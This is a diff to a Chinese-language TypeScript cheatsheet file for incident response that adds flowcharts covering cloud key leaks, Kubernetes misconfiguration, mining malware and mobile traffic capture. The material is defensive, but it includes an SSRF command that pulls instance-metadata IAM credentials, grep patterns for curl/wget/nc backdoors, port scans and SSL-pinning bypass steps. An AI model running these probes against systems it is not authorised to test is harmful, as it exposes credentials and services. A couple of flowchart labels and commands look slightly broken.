-      { title: "看出网带宽异常", cmd: "iftop -nNP -t -s 60 2>/dev/null\n# 或\nvnstat -tr 30" },
+      { title: "看出网带宽异常", mermaid: `flowchart TD\n    A[流量异常] --> B{iftop 出向大流量?}\n    B --> C[ss -tunap 看连接]\n    C --> D{目的 IP 境外?}\n    D -- 是 --> E[查 ipinfo]\n    E --> F{协议}\n    F -- DNS 隧道 --> G[异常长域名]\n    F -- HTTPS --> H[JA3 指纹\n苏黎世/瑞士]`, cmd: "iftop -nNP -t -s 60 2>/dev/null\n# 或\nvnstat -tr 30" },
       { title: "TOP 出网连接（谁在往外传）", cmd: "sudo iftop -nNP -o 2s\n# 或\nsudo nethogs -t -c 5" },
       { title: "看不在白名单的连接", cmd: "sudo lsof -i -n -P | rg -v ':(22|53|80|443|3306|6379) '" },
       { title: "抓 5 分钟包看外发目的", cmd: "sudo timeout 300 tcpdump -ni any 'not (port 22 or port 80 or port 443)' -w /tmp/exfil.pcap\ntshark -r /tmp/exfil.pcap -q -z conv,ip | head -30", tool: "tshark" },
@@ -471,7 +471,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "npm / pip / go mod 里冒出的可疑最新版本",
     tags: ["供应链", "依赖"],
     steps: [
-      { title: "看近期新装/升级过的包", cmd: "# npm\nnpm ls --all --depth=0\ncat package-lock.json | jq '.packages | to_entries[] | {name:.key, version:.value.version, integrity:.value.integrity}' | head -30\n# pip\npip list --format=freeze" },
+      { title: "看近期新装/升级过的包", mermaid: `flowchart TD\n    A[依赖包异常] --> B{lockfile 改过?}\n    B -- 是 --> C[比对上游 commit]\n    C --> D{是新维护者?}\n    D -- 是 --> E[可疑!立即回滚]\n    D -- 否 --> F[npm audit]\n    F --> G[socket.dev 扫]\n    G --> H[CI 锁 SHA 校验]`, cmd: "# npm\nnpm ls --all --depth=0\ncat package-lock.json | jq '.packages | to_entries[] | {name:.key, version:.value.version, integrity:.value.integrity}' | head -30\n# pip\npip list --format=freeze" },
       { title: "扫已知漏洞和恶意包", cmd: "npm audit --audit-level=high\npip install pip-audit && pip-audit\ntrivy fs .", tool: "trivy" },
       { title: "静态扫源码找可疑动作", cmd: "rg -n --no-ignore -E 'child_process|require\\([\"'\\'']http[s]?[\"'\\'']\\)|net\\.createConnection|eval\\(atob' node_modules 2>/dev/null | head -30" },
       { title: "锁版本 + 私有 registry", cmd: "npm ci                                        # 严格按 lock 装\nnpm config set registry https://registry.npmmirror.com\n# 用 verdaccio / Nexus 自建私仓，白名单同步" },
@@ -486,7 +486,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "定位到进程 → 线程 → 系统调用",
     tags: ["cpu", "性能"],
     steps: [
-      { title: "看 TOP 进程", cmd: "top -bn1 -o %CPU | head -15\nps -eo pid,%cpu,%mem,user,cmd --sort=-%cpu | head" },
+      { title: "看 TOP 进程", mermaid: `flowchart TD\n    A[CPU 100] --> B{top 谁在跑?}\n    B --> C{进程类型}\n    C -- 应用进程 --> D[查线程\nperf/pstack]\n    C -- kdevtmpfs/xmrig --> E[挖矿木马]\n    C -- java/python --> F[业务慢循环]\n    D --> G[strace 看 syscall]\n    E --> H[清计划任务]`, cmd: "top -bn1 -o %CPU | head -15\nps -eo pid,%cpu,%mem,user,cmd --sort=-%cpu | head" },
       { title: "看该进程的线程", cmd: "top -Hp <pid>\nps -T -p <pid>" },
       { title: "抓一段 syscall 看它在干嘛", cmd: "sudo strace -c -p <pid> &\nsleep 10; kill %1" },
       { title: "Java 应用 → 线程栈", cmd: "jstack <pid> > /tmp/stack.log\n# 查最烫的线程\nprintf '%x\\n' <thread-id>       # 转 16 进制在 stack.log 里搜" },
@@ -500,7 +500,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "df 正常但空间不够 → 多半是 deleted 但未释放",
     tags: ["磁盘"],
     steps: [
-      { title: "各分区使用", cmd: "df -h\ndf -i           # inode 也可能爆" },
+      { title: "各分区使用", mermaid: `flowchart TD\n    A[磁盘满] --> B{df -h 看挂点}\n    B --> C{哪块满?}\n    C --> D[du -sh /* 排]\n    D --> E{大文件在哪?}\n    E -- /var/log --> F[logrotate]\n    E -- /tmp --> G[清临时]\n    E -- /data --> H[业务数据]\n    A2[inode 满?] --> I[df -i]`, cmd: "df -h\ndf -i           # inode 也可能爆" },
       { title: "找大目录", cmd: "sudo du -h -d 1 /var 2>/dev/null | sort -hr | head\nsudo ncdu /var  # 交互式" },
       { title: "找大文件", cmd: "sudo find / -xdev -type f -size +500M -exec ls -lh {} \\; 2>/dev/null | sort -k5 -h | tail" },
       { title: "已删除但被进程占着", desc: "df 显示满 · du 却对不上 → 就是这类", cmd: "sudo lsof +L1 | head\n# 找到后重启对应进程即可释放" },
@@ -514,7 +514,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "看日志 → 端口占用 → 权限 → 依赖",
     tags: ["systemd", "服务"],
     steps: [
-      { title: "看 unit 状态和最近日志", cmd: "systemctl status my-svc -l --no-pager\njournalctl -u my-svc -n 200 --no-pager", tool: "journalctl" },
+      { title: "看 unit 状态和最近日志", mermaid: `flowchart TD\n    A[unit failed] --> B{journalctl -xe}\n    B --> C{报错类型}\n    C -- port in use --> D[lsof -i:port]\n    C -- file not found --> E[路径/权限]\n    C -- segfault --> F[查 coredump]\n    C -- dependency fail --> G[先起依赖]\n    D --> H[改端口/停占]\n    E --> H`, cmd: "systemctl status my-svc -l --no-pager\njournalctl -u my-svc -n 200 --no-pager", tool: "journalctl" },
       { title: "端口是否被占", cmd: "sudo lsof -iTCP:<port> -sTCP:LISTEN -n -P" },
       { title: "配置语法先自检", cmd: "nginx -t\nsshd -t\n# 应用自身: my-svc --check-config" },
       { title: "手工前台跑一遍看真实报错", cmd: "sudo -u my-svc-user /usr/bin/my-svc --foreground --debug" },
@@ -528,7 +528,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "确认是不是 OOM · 定位最耗内存的家伙",
     tags: ["内存", "oom"],
     steps: [
-      { title: "找 OOM 记录", cmd: "sudo dmesg -T | rg -i 'killed process\\|out of memory'\nsudo journalctl -k | rg -i oom" },
+      { title: "找 OOM 记录", mermaid: `flowchart TD\n    A[进程消失] --> B{dmesg OOM?}\n    B -- 是 --> C{哪个 cgroup?}\n    C --> D[memory.limit]\n    D --> E{是 RSS 还是 cache?}\n    E -- RSS --> F[代码泄露/扩容]\n    E -- cache --> G[少用 shmem]\n    A2[应急] --> H[oom_score_adj\nsysctl vm.overcommit]`, cmd: "sudo dmesg -T | rg -i 'killed process\\|out of memory'\nsudo journalctl -k | rg -i oom" },
       { title: "看当前内存 TOP 进程", cmd: "ps -eo pid,%mem,rss,cmd --sort=-%mem | head -15" },
       { title: "cgroup 层是否也在限", cmd: "systemd-cgtop -1 -n 1\n# k8s pod\nkubectl top pod <pod>\nkubectl describe pod <pod> | rg -i oom" },
       { title: "临时应急", cmd: "# 调整 oom_score_adj 保护关键进程\nsudo echo -1000 > /proc/<pid>/oom_score_adj\n# 加 swap 应急\nsudo fallocate -l 2G /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile" },
@@ -542,7 +542,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["nginx", "502", "504", "反代", "gateway"],
     severity: "warn",
     steps: [
-      { title: "先分清是 502 还是 504", desc: "502=connect/read 拒绝或崩溃  504=read timeout 超时", cmd: "curl -sI http://YOUR_HOST:PORT/ | head -1\n# 502 → 走 A 路径\n# 504 → 走 B 路径", tool: "curl" },
+      { title: "先分清是 502 还是 504", mermaid: `flowchart TD\n    A[502/504] --> B{502 vs 504}\n    B -- 502 --> C[upstream 拒]\n    B -- 504 --> D[upstream 超时]\n    C --> E{upstream 进程在?}\n    E -- 否 --> F[起服务]\n    E -- 是 --> G[端口/防火墙]\n    D --> H{proxy_timeout 太小?}\n    H -- 是 --> I[调大]\n    H -- 否 --> J[后端慢]`, desc: "502=connect/read 拒绝或崩溃  504=read timeout 超时", cmd: "curl -sI http://YOUR_HOST:PORT/ | head -1\n# 502 → 走 A 路径\n# 504 → 走 B 路径", tool: "curl" },
       { title: "1) nginx 错误日志定性（关键字）", desc: "connect refused=上游没起 / prematurely closed=崩了 / timed out=网络不通 / no live upstreams=全挂", cmd: "tail -50 /var/log/nginx/error.log\n# 常见关键字:\n#   (111: Connection refused)\n#   upstream prematurely closed connection\n#   (110: Connection timed out)\n#   no live upstreams\n#   host not found in upstream" },
       { title: "2) 上游进程活没活", cmd: "systemctl status my-svc\nss -ltnp | grep :<internal-port>\n# 没监听 → 服务挂了，跳到 A1" },
       { title: "3) 从 nginx 机直连上游", desc: "本机 curl 上游端口，200=nginx 配错  非200=上游本身问题", cmd: "curl -v --max-time 5 http://127.0.0.1:<internal-port>/", tool: "curl" },
@@ -570,7 +570,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["aws", "ak", "iam", "应急"],
     severity: "danger",
     steps: [
-      { title: "立刻禁用 key（不是删，先禁）", cmd: "aws iam update-access-key --access-key-id AKIA... --status Inactive --user-name <user>\n# 隔离用户\naws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AWSDenyAll" },
+      { title: "立刻禁用 key（不是删，先禁）", mermaid: `flowchart TD\n    A[AK 泄漏] --> B[立即 DisableAccessKey]\n    B --> C[删除 IAM User\n或 RotateAccessKey]\n    C --> D{看 CloudTrail\n最近 1h 调用?}\n    D --> E[异常资源 EC2/Lambda]\n    E --> F[停实例\n删快照/SG]\n    F --> G[换 STS 短凭]`, cmd: "aws iam update-access-key --access-key-id AKIA... --status Inactive --user-name <user>\n# 隔离用户\naws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AWSDenyAll" },
       { title: "查 key 最近调用了什么", cmd: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIA... --max-results 200\naws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=<user> --start-time 2026-07-15" },
       { title: "看资源变更（新建 EC2 / IAM / S3）", cmd: "# CloudTrail 里过 RunInstances / CreateUser / PutBucketPolicy\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances\naws ec2 describe-instances --query 'Reservations[].Instances[?LaunchTime>=`2026-07-15`].[InstanceId,LaunchTime,Placement.AvailabilityZone]'" },
       { title: "全区扫异常算力（挖矿）", cmd: "for r in us-east-1 us-west-2 ap-northeast-1 eu-west-1; do\n  echo \"== $r ==\"\n  aws ec2 describe-instances --region $r --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[InstanceId,InstanceType,LaunchTime]' --output table\ndone" },
@@ -587,7 +587,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["aws", "aliyun", "sg", "端口"],
     severity: "warn",
     steps: [
-      { title: "AWS 全区列 0.0.0.0/0 规则", cmd: "for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do\n  aws ec2 describe-security-groups --region $r \\\n    --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName,VpcId]' \\\n    --output table\ndone" },
+      { title: "AWS 全区列 0.0.0.0/0 规则", mermaid: `flowchart TD\n    A[0.0.0.0/0 端口] --> B{端口类型}\n    B -- 22/3389 --> C[SSH/RDP 暴露\n立即收窄]\n    B -- 3306/6379 --> D[DB 暴露\n必须内网]\n    B -- 80/443 --> E[可接受但要 WAF]\n    C --> F[改白名单 IP]\n    D --> F\n    F --> G[保留证据\n通知合规]`, cmd: "for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do\n  aws ec2 describe-security-groups --region $r \\\n    --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName,VpcId]' \\\n    --output table\ndone" },
       { title: "只看高危端口暴露", cmd: "aws ec2 describe-security-groups --query 'SecurityGroups[].IpPermissions[?FromPort==`22`||FromPort==`3389`||FromPort==`3306`||FromPort==`6379`||FromPort==`9200`||FromPort==`27017`][]'" },
       { title: "阿里云 SG 全查", cmd: "aliyun ecs DescribeSecurityGroups --RegionId cn-hangzhou\naliyun ecs DescribeSecurityGroupAttribute --SecurityGroupId sg-xxx --Direction ingress" },
       { title: "外网侧复核（真的通吗）", cmd: "# 从外网机器扫\nnmap -Pn -p 22,3306,6379,9200 <公网IP>\n# 或 masscan\nmasscan -p22,3306,6379 <公网IP>/32 --rate 1000", tool: "nmap" },
@@ -603,7 +603,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["s3", "oss", "泄漏"],
     severity: "danger",
     steps: [
-      { title: "AWS 全桶扫可公开", cmd: "aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\\t' '\\n' | while read b; do\n  echo \"== $b ==\"\n  aws s3api get-bucket-acl --bucket $b --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]' 2>/dev/null\n  aws s3api get-bucket-policy-status --bucket $b 2>/dev/null\ndone" },
+      { title: "AWS 全桶扫可公开", mermaid: `flowchart TD\n    A[S3 桶公开] --> B[立即 BlockPublicAcls]\n    B --> C[ListBucket 看异常 GET]\n    C --> D{被列过?}\n    D -- 是 --> E[查 CloudTrail\n谁访问过]\n    E --> F[通知数据 owner]\n    F --> G[加密+版本+日志]\n    G --> H[启用 Object Lock]`, cmd: "aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\\t' '\\n' | while read b; do\n  echo \"== $b ==\"\n  aws s3api get-bucket-acl --bucket $b --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]' 2>/dev/null\n  aws s3api get-bucket-policy-status --bucket $b 2>/dev/null\ndone" },
       { title: "阿里云 OSS", cmd: "ossutil ls oss://\nfor b in $(ossutil ls oss:// | rg 'oss://' | awk '{print $NF}'); do\n  echo \"== $b ==\"\n  ossutil stat $b | rg -i 'acl\\|policy'\ndone" },
       { title: "外网复核（匿名能不能拉）", cmd: "# 无凭据直接列\ncurl -sI https://<bucket>.s3.amazonaws.com/\ncurl -s  https://<bucket>.s3.amazonaws.com/?list-type=2 | head -30\n# OSS\ncurl -s https://<bucket>.oss-cn-hangzhou.aliyuncs.com/?list-type=2" },
       { title: "关匿名 + 打 Block Public Access", cmd: "aws s3api put-public-access-block --bucket <b> \\\n  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\n# OSS\nossutil set-acl oss://<bucket> private -b" },
@@ -619,7 +619,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["iam", "越权", "aws"],
     severity: "warn",
     steps: [
-      { title: "跑 pmapper 出提权路径", cmd: "pip install principalmapper\npmapper graph create\npmapper query 'preset privesc *'\npmapper visualize --filetype png" },
+      { title: "跑 pmapper 出提权路径", mermaid: `flowchart TD\n    A[IAM 提权] --> B{Permission}\n    B -- iam:* --> C[改 iam:PassRole]\n    B -- lambda:Invoke --> D[Lambda 后门]\n    B -- ec2:RunInstances --> E[起矿机]\n    B -- sts:AssumeRole --> F[跨账号接管]\n    C --> G[删宽松 policy\n改 SCP]`, cmd: "pip install principalmapper\npmapper graph create\npmapper query 'preset privesc *'\npmapper visualize --filetype png" },
       { title: "手工过高危权限", cmd: "aws iam list-users --query 'Users[].UserName' --output text | tr '\\t' '\\n' | while read u; do\n  aws iam list-attached-user-policies --user-name $u --query 'AttachedPolicies[?PolicyArn==`arn:aws:iam::aws:policy/AdministratorAccess`]'\ndone" },
       { title: "查危险 inline policy", cmd: "aws iam list-users --query 'Users[].UserName' --output text | tr '\\t' '\\n' | while read u; do\n  for p in $(aws iam list-user-policies --user-name $u --query 'PolicyNames[]' --output text); do\n    aws iam get-user-policy --user-name $u --policy-name $p | rg -i 'iam:PassRole\\|iam:AttachUser\\|\"\\*\"'\n  done\ndone" },
       { title: "跨账号信任关系审计", cmd: "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=null]].[RoleName,AssumeRolePolicyDocument]' --output json | jq '.'" },
@@ -635,7 +635,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["账单", "挖矿", "cost"],
     severity: "danger",
     steps: [
-      { title: "按服务拆最近 7 天账单", cmd: "aws ce get-cost-and-usage \\\n  --time-period Start=2026-07-09,End=2026-07-16 \\\n  --granularity DAILY --metrics UnblendedCost \\\n  --group-by Type=DIMENSION,Key=SERVICE" },
+      { title: "按服务拆最近 7 天账单", mermaid: `flowchart TD\n    A[账单突增] --> B{Cost Explorer\n按服务拆}\n    B --> C{哪个服务?}\n    C -- EC2/EKS --> D[矿机实例\n立即停]\n    C -- NAT/流量 --> E[出向流量盗刷]\n    C -- Lambda --> F[恶意函数]\n    D --> G[关停+删 SG\n设账单告警]`, cmd: "aws ce get-cost-and-usage \\\n  --time-period Start=2026-07-09,End=2026-07-16 \\\n  --granularity DAILY --metrics UnblendedCost \\\n  --group-by Type=DIMENSION,Key=SERVICE" },
       { title: "按区域拆（找异常区）", cmd: "aws ce get-cost-and-usage --time-period Start=2026-07-09,End=2026-07-16 \\\n  --granularity DAILY --metrics UnblendedCost \\\n  --group-by Type=DIMENSION,Key=REGION" },
       { title: "定位到具体实例 / 资源", cmd: "aws ce get-cost-and-usage-with-resources \\\n  --time-period Start=2026-07-14,End=2026-07-16 \\\n  --granularity DAILY --metrics UnblendedCost \\\n  --filter file://filter.json \\\n  --group-by Type=DIMENSION,Key=RESOURCE_ID" },
       { title: "异常区列所有 running 实例", cmd: "aws ec2 describe-instances --region <bad-region> \\\n  --filters Name=instance-state-name,Values=running \\\n  --query 'Reservations[].Instances[].[InstanceId,InstanceType,LaunchTime,Tags]' --output table" },
@@ -651,7 +651,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["ssrf", "imds", "sts"],
     severity: "danger",
     steps: [
-      { title: "确认应用有 SSRF 触点", cmd: "curl -s 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# 拿到 role name 后再拉凭据\ncurl -s 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'" },
+      { title: "确认应用有 SSRF 触点", mermaid: `flowchart TD\n    A[SSRF → 169.254.169.254] --> B{IMDSv1 强制?}\n    B -- 是 --> C[AK/SK 直接泄漏]\n    C --> D[改 IMDSv2 token]\n    D --> E[绑定 IAM Role\n最小权限]\n    B -- 否 --> F{业务需要\n取元数据?}\n    F -- 是 --> G[代理层白名单\n跳 token 验证]`, cmd: "curl -s 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# 拿到 role name 后再拉凭据\ncurl -s 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'" },
       { title: "查该 role 最近调用记录", cmd: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=<role> --max-results 200" },
       { title: "强制 IMDSv2（禁 v1）", cmd: "aws ec2 modify-instance-metadata-options --instance-id i-xxx \\\n  --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1" },
       { title: "全区批量收敛 IMDSv1", cmd: "for r in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do\n  for i in $(aws ec2 describe-instances --region $r --query 'Reservations[].Instances[?MetadataOptions.HttpTokens==`optional`].InstanceId' --output text); do\n    aws ec2 modify-instance-metadata-options --region $r --instance-id $i --http-tokens required\n  done\ndone" },
@@ -708,7 +708,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["k8s", "rbac", "越权"],
     severity: "warn",
     steps: [
-      { title: "谁绑了 cluster-admin", cmd: "kubectl get clusterrolebinding -o json | jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") | \"\\(.metadata.name) -> \\(.subjects)\"'" },
+      { title: "谁绑了 cluster-admin", mermaid: `flowchart TD\n    A[RBAC 越权] --> B{谁绑\ncluster-admin?}\n    B --> C[SA/Role/ClusterRole]\n    C --> D{可建 Pod/Exec?}\n    D -- 是 --> E[提权到\n任意 Node]\n    E --> F[审计谁用\nkubectl auth can-i]\n    F --> G[删宽泛 RBAC\n改最小权限]`, cmd: "kubectl get clusterrolebinding -o json | jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") | \"\\(.metadata.name) -> \\(.subjects)\"'" },
       { title: "找危险动词组合（* on *）", cmd: "kubectl get clusterrole -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]?==\"*\") and (.resources[]?==\"*\")) | .metadata.name'" },
       { title: "扫可以偷 secret 的 SA", cmd: "kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:default:default\n# 批量扫\nfor sa in $(kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{\"\\n\"}{end}'); do\n  ns=\"${sa%/*}\"; name=\"${sa#*/}\"\n  can=$(kubectl auth can-i list secrets -n $ns --as=system:serviceaccount:$ns:$name 2>/dev/null)\n  [ \"$can\" = \"yes\" ] && echo \"[!] $sa\"\ndone" },
       { title: "kubectl-who-can 一把梭", cmd: "kubectl krew install who-can\nkubectl who-can create pods --all-namespaces\nkubectl who-can '*' '*' --all-namespaces" },
@@ -725,7 +725,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["k8s", "etcd", "泄漏"],
     severity: "danger",
     steps: [
-      { title: "外网侧扫 2379", cmd: "nmap -Pn -p 2379,2380 <master-ip>\n# 尝试无证书直连\ncurl -sk https://<master-ip>:2379/version" },
+      { title: "外网侧扫 2379", mermaid: `flowchart TD\n    A[Etcd 暴露] --> B{2379 公网开?}\n    B -- 是 --> C[立即关 SG/FW]\n    C --> D{启用 auth?}\n    D -- 否 --> E[全集群数据\n明文可读]\n    E --> F[轮换证书\n强认证]\n    D -- 是 --> G[看 RBAC\n谁可读 secrets]`, cmd: "nmap -Pn -p 2379,2380 <master-ip>\n# 尝试无证书直连\ncurl -sk https://<master-ip>:2379/version" },
       { title: "master 上校验 etcd 参数", cmd: "ps aux | rg etcd | tr ' ' '\\n' | rg -- '--(client-cert-auth\\|listen-client-urls\\|cert-file\\|trusted-ca-file)'\n# 应该都开 --client-cert-auth=true 且不监听 0.0.0.0" },
       { title: "已开鉴权？测证书路径", cmd: "sudo ETCDCTL_API=3 etcdctl \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  --endpoints=https://127.0.0.1:2379 endpoint health" },
       { title: "有 secret 落地？评估影响面", cmd: "sudo ETCDCTL_API=3 etcdctl ... get / --prefix --keys-only | rg '/secrets/' | wc -l\n# 强烈建议开 encryption-at-rest\ncat /etc/kubernetes/manifests/kube-apiserver.yaml | rg encryption-provider" },
@@ -741,7 +741,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["k8s", "镜像", "供应链"],
     severity: "warn",
     steps: [
-      { title: "列全集群在跑镜像", cmd: "kubectl get pod -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{\"\\t\"}{range .spec.containers[*]}{.image}{\",\"}{end}{\"\\n\"}{end}' | sort -u" },
+      { title: "列全集群在跑镜像", mermaid: `flowchart TD\n    A[镜像异常] --> B{来源仓库}\n    B -- 官方 --> C[看 digest\n是否一致]\n    B -- 第三方 --> D[可疑!扫 CVE]\n    D --> E[trivy/grype]\n    E --> F{有后门/挖矿?}\n    F -- 是 --> G[删 deploy\n禁 registry]\n    G --> H[镜像签名\ncosign]`, cmd: "kubectl get pod -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{\"\\t\"}{range .spec.containers[*]}{.image}{\",\"}{end}{\"\\n\"}{end}' | sort -u" },
       { title: "Trivy 扫全部 in-use 镜像", cmd: "for img in $(kubectl get pod -A -o jsonpath='{range .items[*].spec.containers[*]}{.image}{\"\\n\"}{end}' | sort -u); do\n  echo \"== $img ==\"\n  trivy image --severity HIGH,CRITICAL --quiet $img\ndone", tool: "trivy" },
       { title: "查用了 :latest 或未固定 digest", cmd: "kubectl get pod -A -o jsonpath='{range .items[*].spec.containers[*]}{.image}{\"\\n\"}{end}' | rg -v '@sha256:' | rg ':latest\\|:main\\|:dev' | sort -u" },
       { title: "拦准入：cosign / kyverno", cmd: "# 只允许签名镜像\nkubectl apply -f - <<'YAML'\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata: { name: require-signed }\nspec:\n  validationFailureAction: enforce\n  rules:\n    - name: check-signature\n      match: { resources: { kinds: [Pod] } }\n      verifyImages:\n        - imageReferences: [\"registry.mycorp.com/*\"]\n          attestors: [{ entries: [{ keys: { publicKeys: \"...\" } }] }]\nYAML" },
@@ -757,7 +757,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["k8s", "cronjob", "后门"],
     severity: "danger",
     steps: [
-      { title: "列全集群 CronJob", cmd: "kubectl get cronjob -A -o wide" },
+      { title: "列全集群 CronJob", mermaid: `flowchart TD\n    A[隐藏 CronJob] --> B{kubectl get cj -A}\n    B --> C{可疑镜像/命令?}\n    C --> D[curl/wget 外网]\n    D --> E[base64 反弹 shell]\n    E --> F[禁外部沙箱\n排查 SA 权限]\n    F --> G[审计\npolicy/cronjob]`, cmd: "kubectl get cronjob -A -o wide" },
       { title: "过含 curl / wget / base64 / nc 的命令", cmd: "kubectl get cronjob -A -o json | jq -r '.items[] | \"\\(.metadata.namespace)/\\(.metadata.name)\\t\\(.spec.jobTemplate.spec.template.spec.containers[].command)\\t\\(.spec.jobTemplate.spec.template.spec.containers[].args)\"' | rg -i 'curl\\|wget\\|base64\\|/bin/bash\\|nc '" },
       { title: "看历史 Job 输出", cmd: "kubectl get job -A --sort-by=.metadata.creationTimestamp | tail -30\nkubectl logs -n <ns> job/<job> --tail 500" },
       { title: "宿主机 crontab 也别漏", cmd: "# 每个 node\nfor u in $(cut -d: -f1 /etc/passwd); do sudo crontab -u $u -l 2>/dev/null | rg -v '^#\\|^$' && echo \"[$u]\"; done\nsudo cat /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* 2>/dev/null | rg -i 'curl\\|wget\\|base64'" },
@@ -773,7 +773,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["k8s", "node", "kubelet"],
     severity: "warn",
     steps: [
-      { title: "看是哪一环", cmd: "kubectl describe node <node> | rg -A2 Conditions\nkubectl get node <node> -o json | jq '.status.conditions'" },
+      { title: "看是哪一环", mermaid: `flowchart TD\n    A[Node NotReady] --> B{kubelet 状态}\n    B -- CrashLoop --> C[systemctl status]\n    B -- 磁盘满 --> D[df -h /var/lib]\n    B -- 内存压 --> E[OOM/limit]\n    B -- 网络 --> F[calico/flannel]\n    C --> G[看日志\ncoredns/scheduler]\n    G --> H[drain 节点\n修复或重装]`, cmd: "kubectl describe node <node> | rg -A2 Conditions\nkubectl get node <node> -o json | jq '.status.conditions'" },
       { title: "kubelet 日志", cmd: "ssh <node> 'sudo journalctl -u kubelet -n 200 --no-pager'\nssh <node> 'sudo systemctl status kubelet'" },
       { title: "runtime（containerd / docker）", cmd: "ssh <node> 'sudo crictl ps -a | head -20'\nssh <node> 'sudo systemctl status containerd'\nssh <node> 'sudo journalctl -u containerd -n 100 --no-pager'" },
       { title: "CNI 网络", cmd: "kubectl get pod -n kube-system -o wide | rg 'calico\\|flannel\\|cilium'\nssh <node> 'ip -br a; ip route; ls /etc/cni/net.d/'\nssh <node> 'sudo journalctl -u calico-node -n 100 --no-pager' # 举例" },
@@ -792,7 +792,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["android", "抓包", "frida", "mitm"],
     severity: "info",
     steps: [
-      { title: "起 mitmproxy 代理", cmd: "mitmproxy -p 8080 --set block_global=false\n# 或 web UI\nmitmweb -p 8080 --web-host 0.0.0.0", tool: "mitmproxy" },
+      { title: "起 mitmproxy 代理", mermaid: `flowchart TD\n    A[Android 抓包] --> B{root?}\n    B -- 是 --> C[Magisk + TrustUserCerts]\n    B -- 否 --> D[VirtualApp\n或 Frida 注入]\n    D --> E{SSL Pinning?}\n    E -- 有 --> F[objection/unpinning]\n    E -- 无 --> G[直接抓]\n    F --> H[JustTrustMe\n绕过]`, cmd: "mitmproxy -p 8080 --set block_global=false\n# 或 web UI\nmitmweb -p 8080 --web-host 0.0.0.0", tool: "mitmproxy" },
       { title: "手机走代理", cmd: "# WiFi → 高级 → 代理 → 手动 → PC-IP:8080\n# 装 CA：http://mitm.it → Android 证书" },
       { title: "Android 7+ 用户证书不认，得进系统证书", cmd: "# root 手机\nopenssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1\ncp ~/.mitmproxy/mitmproxy-ca-cert.pem <hash>.0\nadb push <hash>.0 /sdcard/\nadb shell 'su -c \"mount -o rw,remount /system && cp /sdcard/<hash>.0 /system/etc/security/cacerts/ && chmod 644 /system/etc/security/cacerts/<hash>.0\"'" },
       { title: "无 root：用 objection patch APK", cmd: "apktool d target.apk -o out\n# 加 network_security_config.xml 信任 user CA\nobjection patchapk -s target.apk\nadb install target.objection.apk", tool: "objection" },
@@ -809,7 +809,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["ios", "抓包", "pinning"],
     severity: "info",
     steps: [
-      { title: "起 mitmproxy 并把 CA 装进 iOS", cmd: "mitmproxy -p 8080\n# 手机 Safari 打开 http://mitm.it 装描述文件\n# 设置 → 通用 → VPN 与设备管理 → 安装描述文件\n# 设置 → 通用 → 关于本机 → 证书信任设置 → 打开 mitmproxy" },
